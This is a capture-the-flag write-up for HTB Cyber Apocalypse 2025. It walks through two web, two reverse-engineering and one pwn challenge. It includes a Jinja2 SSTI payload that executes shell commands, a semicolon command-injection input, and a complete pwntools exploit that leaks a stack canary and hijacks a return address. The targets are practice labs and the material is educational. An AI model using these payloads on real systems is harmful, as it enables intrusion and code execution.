---
title: HTB CYBER APOCALYPSE CTF 2025 WRITEUP
author: ywdh
tags: ["ctf", "htb"]
date: 2025-03-27
---
# HTB CYBER APOCALYPSE CTF 2025 WRITEUP

[TOC]

# Web Exploitation

## Trial by Fire

### Description

<details>
As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.
</details>

### Required Knowledge

- Server Side Template Injection (SSTI)
- Docker Container

### Solve Walkthrough

The flag file location is not changed to root directory or somewhere else, it inside the app challenge directory. Basically, this logic behind the app is to play a game. The objective of the game is to **defeat a dragon** that have health **1337**. But, we can't defeat the dragon in a regular way, we've to find a vulnerability to defeat the dragon or at least to get the flag (not matter we win or not). So, I played this game a little bit after that I realize something that can be a vulnerability. Take a look at the image below.

![Trial By Fire-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_web1-01.png)

Why it can be a vulnerability? As simple as I can manipulate the win/lose condition at there. See the route or logic behind the `/battle-report` url below.

```python=
# routes.py

@web.route('/battle-report', methods=['POST'])
def battle_report():
    warrior_name = session.get("warrior_name", "Unknown Warrior")
    battle_duration = request.form.get('battle_duration', "0")

    stats = {
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'damage_taken': request.form.get('damage_taken', "0"),
        'spells_cast': request.form.get('spells_cast', "0"),
        'turns_survived': request.form.get('turns_survived', "0"),
        'outcome': request.form.get('outcome', 'defeat')
    }

    REPORT_TEMPLATE = f"""
    <html>SSTI 
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Battle Report - The Flame Peaks</title>
        <link rel="icon" type="image/png" href="/static/images/favicon.png" />
        <link href="https://unpkg.com/nes.css@latest/css/nes.min.css" rel="stylesheet" />
        <link rel="stylesheet" href="/static/css/style.css">
    </head>
    <body>
        <div class="nes-container with-title is-dark battle-report">
            <p class="title">Battle Report</p>

            <div class="warrior-info">
                <i class="nes-icon is-large heart"></i>
                <p class="nes-text is-primary warrior-name">{warrior_name}</p>
            </div>

            <div class="report-stats">
                <div class="nes-container is-dark with-title stat-group">
                    <p class="title">Battle Statistics</p>
                    <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
                    <p>💔 Damage Taken: <span class="nes-text is-error">{stats['damage_taken']}</span></p>
                    <p>✨ Spells Cast: <span class="nes-text is-warning">{stats['spells_cast']}</span></p>
                    <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
                    <p>⚔️ Battle Duration: <span class="nes-text is-secondary">{float(battle_duration):.1f} seconds</span></p>
                </div>

                <div class="nes-container is-dark battle-outcome {stats['outcome']}">
                    <h2 class="nes-text is-primary">
                        {"🏆 Glorious Victory!" if stats['outcome'] == "victory" else "💀 Valiant Defeat"}
                    </h2>
                    <p class="nes-text">{random.choice(DRAGON_TAUNTS)}</p>
                </div>
            </div>

            <div class="report-actions nes-container is-dark">
                <a href="/flamedrake" class="nes-btn is-primary">⚔️ Challenge Again</a>
                <a href="/" class="nes-btn is-error">🏰 Return to Entrance</a>
            </div>
        </div>
    </body>
    </html>
    """

    return render_template_string(REPORT_TEMPLATE)
```

Notice that **only POST request is accepted**, so be careful when you intercept the request. The `stats` array contains **un-sanitized user input** and the function is return a `render_template_string` that can cause a SSTI vulnerability. But, how we can manipulate the POST request ? **Play a little bit and when you lose, you can intercept using burp suite**.

Here's the POC when I read the flag. Basically, this payload is to import the `os` and use `popen` to cat the `flag.txt` .

```python
damage_dealt={{config.__class__.__init__.__globals__['os'].popen('cat+flag.txt').read()}}&damage_taken=100&spells_cast=2&turns_survived=3&outcome=defeat&battle_duration=18.116
```

![Trial By Fire-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_web1-02.png)

Okay, now let's manipulate the POST request to `/battle-report` in the remote target. Here's the POC:

![Trial By Fire-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_web1-03.png)

Actually, you can see the SSTI vulnerability directly in the given source code, specifically in the `/challenges/application/templates/index.html` . As the result, in the index page, it will show `49` that represent of `7*7` .

```html=
<!-- index.html -->

<body>
  <div class="home-container nes-container is-rounded">
    <h1 class="nes-text is-error">Welcome to the Flame Peaks</h1>
    <p class="nes-text">
      In a land of burning rivers and searing heat, the Fire Drake stands guard over the Emberstone. Many have sought its power; none have prevailed.
      <br><br>
      Legends speak of ancient template scrolls—arcane writings that twist fate when exploited. Hidden symbols may change everything.
      <br><br>
      Can you read the runes? Perhaps {{ 7 * 7 }} is the key. <!-- SSTI -->
    </p>
    
    <form action="/begin" method="POST" class="warrior-form nes-container is-rounded">
      <div class="form-group">
        <label for="warrior_name" class="nes-text is-error">What is your name, brave warrior?</label>
        <input type="text" id="warrior_name" name="warrior_name" class="nes-input" required placeholder="Enter your name..." maxlength="30" style="background-color: rgba(17, 24, 39, 0.95);">
      </div>
      <button type="submit" class="nes-btn is-error challenge-button">
        ⚔️ Challenge the Fire Drake
      </button>
    </form>
  </div>
</body>
```

You can notice in the opening of the website.

![Trial By Fire-04](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_web1-04.png)

### Flag

<kbd>HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_cce96f85ad54b396cdee745fbe91bf5b}</kbd>

## Whispers of the Moonbeam

### Description

<details>
In the heart of Valeria's bustling capital, the Moonbeam Tavern stands as a lively hub of whispers, wagers, and illicit dealings. Beneath the laughter of drunken patrons and the clinking of tankards, it is said that the tavern harbors more than just ale and merriment—it is a covert meeting ground for spies, thieves, and those loyal to Malakar's cause. The Fellowship has learned that within the hidden backrooms of the Moonbeam Tavern, a crucial piece of information is being traded—the location of the Shadow Veil Cartographer, an informant who possesses a long-lost map detailing Malakar’s stronghold defenses. If the fellowship is to stand any chance of breaching the Obsidian Citadel, they must obtain this map before it falls into enemy hands.
</details>

### Required Knowledge

- Command Injection

### Solve Walkthrough

When open the web url, type `help` to see list what commands that can be use. One command called `gossip` is behave like `ls` command. The `flag.txt` file is located at the current directory.

![Whispers of the Moonbeam-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_web2-01.png)

Okay, now let's find out how to read that `flag.txt` file. Simply, we can use **semicolon as delimiter of second command**, like regular command injection attack. So, the first command `gossip` is to bypass the command check and `; cat flag.txt` is to read the flag.

Here's my POC to read the flag.

```bash
gossip; cat flag.txt
```

![Whispers of the Moonbeam-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_web2-02.png)

### Flag
<kbd>HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_df37873135314ddc601fbc674ec2339f}</kbd>

# Reverse

## EncryptedScroll

### Description

<details>
Elowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.
</details>

### Required Knowledge

- C programming
- Reverse binary file

### Solve Walkthrough

#### 1. Basic File Checks

First, I do basic file check using `file` command.

```bash
challenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5e966c94fbbe92e2607134ac2c0c78ee9d555b30, for GNU/Linux 4.4.0, not stripped
```

From the output above, we can see that it is a ELF 64-bit dynamically linked binary with PIE enabled. To get more binary protection, use the `checksec` command.

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Mostly, all the protections is enabled and only **Partial RELRO**.

#### 2. Analyze The Binary

Here's the decompiled code of some interesting functions.

```c=
// challenge.c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined1 buffer [56];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  anti_debug();
  display_scroll();
  printf(&DAT_00102220);
  __isoc99_scanf(%49s,buffer);
  decrypt_message(buffer);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void decrypt_message(char *param_1)

{
  int is_same;
  long in_FS_OFFSET;
  int i;
  char buffer [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  builtin_strncpy(buffer,"IUC|t2nqm4`gm5h`5s2uin4u2d~",0x1c);
  for (i = 0; buffer[i] != '\0'; i = i + 1) {
    buffer[i] = buffer[i] + -1;
  }
  is_same = strcmp(param_1,buffer);
  if (is_same == 0) {
    puts("The Dragon\'s Heart is hidden beneath the Eternal Flame in Eldoria.");
  }
  else {
    puts("The scroll remains unreadable... Try again.");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

From the decompiled of `decrypt_message` we got interesting information, that is the string `IUC|t2nqm4gm5h5s2uin4u2d~` . The logic behind `decrypt_message` is very simple, it just **decrease each character of string "**`**IUC|t2nqm4gm5h5s2uin4u2d~**`**" by 1 and the result will be put in buffer**. Then, our input will be compared with the buffer.

#### 3. Decrypt The Secret Message

To get the flag is simply do the logic `buffer[i] = buffer[i] + -1;` . Take a look at the image below.


![EncryptedScroll-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_rev1-01.png)

As you can see on the image above, the pattern of flag is appears. So, we just simply do for loop to decrypt the message. Here's my solver script.

```python=
#!/usr/bin/env python3

def solve(encrypted_message):
    res = ""
    len_encrypted_message = len(encrypted_message)

    for i in range(len_encrypted_message):
        res += chr(ord(encrypted_message[i]) - 1)

    return res

if __name__ == "__main__":
    encrypted_message = "IUC|t2nqm4`gm5h`5s2uin4u2d~"
    decrypted_message = solve(encrypted_message)
    print(decrypted_message)
```

![EncryptedScroll-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_rev1-02.png)

### Flag

<kbd>HTB{s1mpl3_fl4g_4r1thm3t1c}</kbd>

## SealedRune

### Description

<details>
Elowen has reached the Ruins of Eldrath, where she finds a sealed rune stone glowing with ancient power. The rune is inscribed with a secret incantation that must be spoken to unlock the next step in her journey to find The Dragon’s Heart.
</details>

### Required Knowledge

-   C programming
- Reverse binary file

### Solve Walkthrough

#### 1. Basic File Checks

First, I do basic file check using `file` command.

```bash
./challenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=47f180529af15b5a7d4601583b2944010ae6e092, for GNU/Linux 4.4.0, not stripped
```

From the output above, this is a 64-bit dynamically linked ELF binary. Let's see for others binary protections.

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Same as rev challenge before "_EncryptedScroll_", the binary mostly have all protections, except **Partial RELRO**.

#### 2. Analyze The Binary

Let's see the decompiled code inside the binary. I'm using Ghidra for this case.

```c=
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined1 input [56];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  anti_debug();
  display_rune();
  puts(&DAT_00102750);
  printf("Enter the incantation to reveal its secret: ");
  __isoc99_scanf(%49s,input);
  check_input(input);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void check_input(char *param_1)

{
  int iVar1;
  char *secret_msg;
  long lVar2;
  
  secret_msg = (char *)decode_secret();
  iVar1 = strcmp(param_1,secret_msg);
  if (iVar1 == 0) {
    puts(&DAT_00102050);
    lVar2 = decode_flag();
    printf("\x1b[1;33m%s\x1b[0m\n",lVar2 + 1);
  }
  else {
    puts("\x1b[1;31mThe rune rejects your words... Try again.\x1b[0m");
  }
  free(secret_msg);
  return;
}

undefined8 decode_secret(void)

{
  undefined8 uVar1;
  
  decoded_secret = base64_decode(incantation);
  reverse_str(decoded_secret);
  return uVar1;
}

void * base64_decode(char *param_1)

{
  int iVar1;
  size_t __nmemb;
  void *pvVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  int local_80;
  int local_7c;
  int local_78;
  int i;
  char buffer [72];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  __nmemb = strlen(param_1);
  pvVar2 = calloc(__nmemb,1);
  builtin_strncpy(buffer,"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",0x41);
  local_80 = 0;
  local_7c = 0;
  local_78 = 0;
  for (i = 0; param_1[i] != '\0'; i = i + 1) {
    pcVar3 = strchr(buffer,(int)param_1[i]);
    local_7c = ((int)pcVar3 - (int)buffer) + local_7c * 0x40;
    iVar1 = local_78 + 6;
    if (7 < iVar1) {
      *(char *)((long)pvVar2 + (long)local_80) = (char)(local_7c >> ((char)iVar1 - 8U & 0x1f));
      local_80 = local_80 + 1;
      iVar1 = local_78 + -2;
    }
    local_78 = iVar1;
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return pvVar2;
}

void reverse_str(char *param_1)

{
  char cVar1;
  int msg_length;
  size_t sVar2;
  int i;
  
  sVar2 = strlen(param_1);
  msg_length = (int)sVar2;
  for (i = 0; i < msg_length / 2; i = i + 1) {
    cVar1 = param_1[i];
    param_1[i] = param_1[(long)(msg_length - i) + -1];
    param_1[(long)(msg_length - i) + -1] = cVar1;
  }
  return;
}

undefined8 decode_flag(void)

{
  undefined8 decoded_flag;
  
  decoded_flag = base64_decode(flag);
  reverse_str(decoded_flag);
  return decoded_flag;
}
```

The logic behind the program is pretty simple:

- Our input will compare with the secret message. If our input is same with the secret message, then the flag will appears.
    
- The secret message can be found inside the `decode_secret` function. String **incantation** is stored in the `$RDI` register. The secret message is **encoded with base64** and **reversed**.

#### 3. Decrypt The Secret Message

![SealedRune-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_rev2-01.png)

The image above is the encoded secret message in hex format (stored in `$RDI` register). The combination of each hex characters is `65h 6Dh 46h 79h 5Ah 6Dh 5Ah 31h 62h 6Bh 64h 73h 5Ah 57h 46h 57h 00h`. If we try to decode all hex characters, the output will be `emFyZmZ1bkdsZWFW`. Okay, its seems like base64 encoded string, the output of decoded string is `zarffunGleaV`. We're not done yet, we've to reverse the decoded string, so the final secret message is `VaelGnuffraz`.

If we input the correct secret message, then we got the flag. Here's my solver script.

```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from base64 import b64decode

def solve(encoded_secret_msg) -> bytes:   
    # 1. Decode the hex encoded string.
    hex_decoded = bytes.fromhex(encoded_secret_msg.replace("h", "").replace(" ", "")).decode()
    
    # 2. Decode the base64 encoded string.
    base64_decoded = b64decode(hex_decoded)
    
    # 3. Reverse the decoded string.
    reversed_string = base64_decoded[::-1]
    
    return reversed_string

if __name__ == "__main__":
    encoded_secret_msg = "65h 6Dh 46h 79h 5Ah 6Dh 5Ah 31h 62h 6Bh 64h 73h 5Ah 57h 46h 57h 00h"
    decoded_secret_msg = solve(encoded_secret_msg)
    
    # Input the decoded secret message into the program.
    exe = ELF('./challenge', checksec=0)
    context.binary = exe
    # context.log_level = "DEBUG"
    
    # Start the process
    io = exe.process()
    io.sendline(decoded_secret_msg)
    
    # Print the flag
    search_flag = re.search(r'HTB{.*}', io.recvall(timeout=1).decode())
    flag = search_flag.group(0) if search_flag else None
    print(f"Flag --> {flag}") if flag else print("Flag not found")
    
    io.close()
```

![EncryptedScroll-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_rev1-02.png)

### Flag

<kbd>HTB{run3_m4g1c_r3v34l3d}</kbd>

# Pwn

## Quack Quack

### Description

<details>
On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!
</details>

### Required Knowledge

- C programming
- Buffer overflow vulnerability
- Stack canary protection
- Hijack program flow (ret2win)

### Solve Walkthrough

#### 1. Basic File Checks

First, I do basic file check using `file` command.

```bash
./quack_quack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=225daf82164eadc6e19bee1cd1965754eefed6aa, for GNU/Linux 3.2.0, not stripped
```

From the output above, that is a **64-bit dynamically linked ELF binary**. Next, see the protections using `checksec` command.

```bash
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

As you can see, this binary is full of protection, except PIE / PIC (Position Independent Code). That means every we run the binary, the memory address is still same, such as the buffer, local variable, etc.

#### 2. Analyze The Binary

Unlike reverse engineering challenge before, in pwn we've to know the fundamentals of memory layout, such as stack, heap, etc. In this case, vulnerability of the binary is happen in the stack that can cause buffer overflow. But, inside the binary found a protection called "**Stack Canary**". Basically, it just random value located at `$RBP-0x8` (**64-bit**) / `$EBP-0x4` (**32-bit**).

How can we bypass the Stack Canary protection? We've to know that read function in C is not completely safe. The read function is **leakable**, which means that after input is **not ended with NULL terminated string** (`\x00`). If the string or array of characters is not null terminated string, it can be **leaked some information in the stack**, including _stack canary_. Okay, let's start with decompile the binary.

```c=
undefined8 main(void)

{
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  duckling();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void duckling(void)

{
  char *chk_substring;
  long in_FS_OFFSET;
  char buffer [32];
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  buffer[0] = '\0';
  buffer[1] = '\0';
  buffer[2] = '\0';
  buffer[3] = '\0';
  buffer[4] = '\0';
  buffer[5] = '\0';
  buffer[6] = '\0';
  buffer[7] = '\0';
  buffer[8] = '\0';
  buffer[9] = '\0';
  buffer[10] = '\0';
  buffer[0xb] = '\0';
  buffer[0xc] = '\0';
  buffer[0xd] = '\0';
  buffer[0xe] = '\0';
  buffer[0xf] = '\0';
  buffer[0x10] = '\0';
  buffer[0x11] = '\0';
  buffer[0x12] = '\0';
  buffer[0x13] = '\0';
  buffer[0x14] = '\0';
  buffer[0x15] = '\0';
  buffer[0x16] = '\0';
  buffer[0x17] = '\0';
  buffer[0x18] = '\0';
  buffer[0x19] = '\0';
  buffer[0x1a] = '\0';
  buffer[0x1b] = '\0';
  buffer[0x1c] = '\0';
  buffer[0x1d] = '\0';
  buffer[0x1e] = '\0';
  buffer[0x1f] = '\0';
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,buffer,0x66);
  chk_substring = strstr(buffer,"Quack Quack ");
  if (chk_substring == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",chk_substring + 0x20);
  read(0,&local_68,0x6a);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void duck_attack(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int flag_file;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  flag_file = open("./flag.txt",0);
  if (flag_file < 0) {
    perror("\nError opening flag.txt, please contact an Administrator\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(flag_file,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(flag_file);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

In the `main` function is only call `duckling` function. If we take a look inside `duckling` function, we can directly see that it's happen BOF vuln in our first input : `read(0,buffer,0x66)`. How is that can happen ? You see that in `char buffer [32];` , the program only allocate buffer 32 bytes, but we can overflow it until **0x66 bytes** or **102 bytes in decimal**. Okay, then how can we leak the stack canary ?

Notice that in the `printf("Quack Quack %s, ready to fight the Duck?\n\n> ",chk_substring + 0x20);` can be leak some information in the stack. It's because the output will print **32 bytes (0x20) more information after** `**"Quack Quack "**` **is found**. Okay, let's do a simple math calculation.

```txt
============= STACK LAYOUT =============

[       RET       ] // lives in $rbp+0x8
[    Saved RBP    ] 
[   Stack Canary  ] // lives in $rbp-0x8
[  .............  ] // $rbp-0x10
[  .............  ] // $rbp-0x18
[  .............  ] // $rbp-0x20
[  .............  ] // $rbp-0x28
[  .............  ] // $rbp-0x30
[  .............  ] // $rbp-0x38
[  .............  ] // $rbp-0x40
[  .............  ] // $rbp-0x48
[  .............  ] // $rbp-0x50
[  .............  ] // $rbp-0x58
[  .............  ] // $rbp-0x60
[  .............  ] // $rbp-0x68
[  .............  ] // $rbp-0x70
[  .............  ] // $rbp-0x78
[      Buffer     ] // lives in $rbp-0x80
```

Total of our input is **0x66 bytes** or **102 bytes in decimal**. Our input is started from `$rbp-0x80` until `$rbp-0x20 - 2` (8 bytes every memory cells). Max input of 102 bytes is not only contain junk or a bunch of `'A'` characters, but including the `**"Quack Quack "**` string that have **12 bytes**. So, the total bytes of our input will be 102 - 12 = 90 bytes - 1 = **89 bytes**. What is 1 byte ? it just not to make the program exit.

What is `strstr` function does? It just to **find a substring (param2) in the target string (param1)**.

![QuackQuack-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_pwn1-01.png)

Okay, so our first input will be `"A"*89 + "Quack Quack "` . To get more clear of leaked information, I recommend you to see with pwntools.

#### 3. Exploit The Binary

Here's the first script to leak the stack canary.

```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('./quack_quack', checksec=0)
context.binary = exe
context.log_level = "DEBUG"

# Start the process.
LOCAL = True
if LOCAL:
    io = exe.process()
else:
    io = remote('94.237.54.232', 39055)

# Prepare the payload for the first input.
payload = b"" # -----------------------< Start payload.
payload += b"A" * 32 # ----------------< Fill the 32 bytes buffer.
payload += b"B" * (89 - 32) # ---------< Overflow until 89 bytes.
payload += b"Quack Quack " # ----------< Pass the strstr condition (12 more bytes).

# Send the payload in the first input.
io.recvuntil(b'> ', timeout=1)
io.sendline(payload)

# Maintain current session.
io.interactive()
```

![QuackQuack-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_pwn1-02.png)

Now, we successfully leak the canary. But wait, is that the canary start with the **NULL byte** character (`\x00`)? Yap, that's true, so we need to adjust the output to be stored as canary. For the next input we need to calculate before canary value, so it will not errors or stack smashing detected. Our next input is started from `$rbp-0x60` until **0x6a bytes** or **106 bytes** in decimal. But, we don't need input until the max size, we only need input until `$rbp-0x10` or **88 bytes** more.

```txt
============= STACK LAYOUT =============

[       RET       ] // lives in $rbp+0x8
[    Saved RBP    ] 
[   Stack Canary  ] // lives in $rbp-0x8
[  .............  ] // $rbp-0x10 - Last of second input - 88 bytes
[  .............  ] // $rbp-0x18
[  .............  ] // $rbp-0x20
[  .............  ] // $rbp-0x28
[  .............  ] // $rbp-0x30
[  .............  ] // $rbp-0x38
[  .............  ] // $rbp-0x40
[  .............  ] // $rbp-0x48
[  .............  ] // $rbp-0x50
[  .............  ] // $rbp-0x58
[  .............  ] // $rbp-0x60 - Second input
[  .............  ] // $rbp-0x68
[  .............  ] // $rbp-0x70
[  .............  ] // $rbp-0x78
[      Buffer     ] // Start input
```

After we know the padding of 2nd input, then we can do **ret2win** attack to call `duck_attack` function and read the flag. So, here's my final exploit script.

```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('./quack_quack', checksec=0)
context.binary = exe
context.log_level = "DEBUG"

# Start the process.
LOCAL = False
if LOCAL:
    io = exe.process()
else:
    io = remote('94.237.54.232', 39055)

# Prepare the payload for the first input.
payload = b"" # -----------------------< Start payload.
payload += b"A" * 32 # ----------------< Fill the 32 bytes buffer.
payload += b"B" * (89 - 32) # ---------< Overflow until 89 bytes.
payload += b"Quack Quack " # ----------< Pass the strstr condition (12 more bytes).

# Send the payload in the first input.
io.recvuntil(b'> ', timeout=1)
io.sendline(payload)

# Adjust the leaked canary output.
canary_position = io.recv(timeout=1).split()[2].rstrip(b',')
fixed_output = b'\x00' + canary_position[-7:]
leaked_canary = u64(fixed_output.ljust(8, b'\x00'))
log.info(f"Leaked stack canary is: {hex(leaked_canary)}")

# Prepare payload for the 2nd input.
win_addr = exe.symbols['duck_attack']

payload = b"" # -----------------------< Start payload.
payload += b"C"*88 # ------------------< Padding until Stack Canary.
payload += p64(leaked_canary) # -------< Leaked canary value.
payload += p64(0xdeadbeef) # ----------< Fake address for $RBP.
payload += p64(win_addr) # ------------< Ret2win to read the flag.

# Send the payload + canary in the second input.
io.recvuntil(b'> ', timeout=1)
io.sendline(payload)

# Print the flag.
flag = re.search(r'HTB{.*}', io.recvall(timeout=1).decode())
print(f"Flag --> {flag.group(0)}") if flag else print("Failed to get the flag!")

# Maintain current session.
io.interactive()
```

![QuackQuack-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_pwn1-03.png)

After several attempts about 3 - 10 times, then I can successfully read the flag. Okay, now let's crack the remote machine.

![QuackQuack-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2025/_assets/htb-cyber-apocalypse_pwn1-04.png)

### Flag

<kbd>HTB{~c4n4ry_g035_qu4ck_qu4ck~_c2c1c5fea57c3625c35e8a70d8b4be0a}</kbd>
